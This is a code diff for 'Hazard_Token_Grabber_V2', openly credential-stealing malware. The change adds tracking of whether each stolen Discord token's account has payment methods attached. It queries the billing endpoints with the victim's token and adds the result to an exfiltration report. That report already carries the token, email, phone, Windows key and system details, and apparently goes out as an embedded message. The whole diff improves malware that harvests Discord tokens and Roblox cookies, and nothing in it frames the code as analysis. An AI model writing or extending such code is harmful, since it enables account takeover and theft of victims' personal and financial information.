@@ -125,6 +125,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
+        self.billing_list = []
 
         os.makedirs(self.dir, exist_ok=True)
 
@@ -440,9 +441,10 @@ class Hazard_Token_Grabber_V2(functions):
                 self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
-            billing = bool(len(json.loads(httpx.get(
+            self.billing = bool(len(json.loads(httpx.get(
                 self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
-            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
+            self.billing_list.append(f"Billing: {self.billing}")
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {self.billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
     def grabRobloxCookie(self):
@@ -474,6 +476,7 @@ class Hazard_Token_Grabber_V2(functions):
         image.close()
 
     def finish(self):
+        Billing_hits = "\n".join(self.billing_list)
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
                 path = self.dir+self.sep+i
@@ -552,7 +555,8 @@ class Hazard_Token_Grabber_V2(functions):
                                 WinKey:᠎ {wkey}
                                 Platform:᠎ {wname}
                                 DiskSpace:᠎ {disk}GB
-                                Ram:᠎ {ram}GB```
+                                Ram:᠎ {ram}GB
+                                {Billing_hits}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
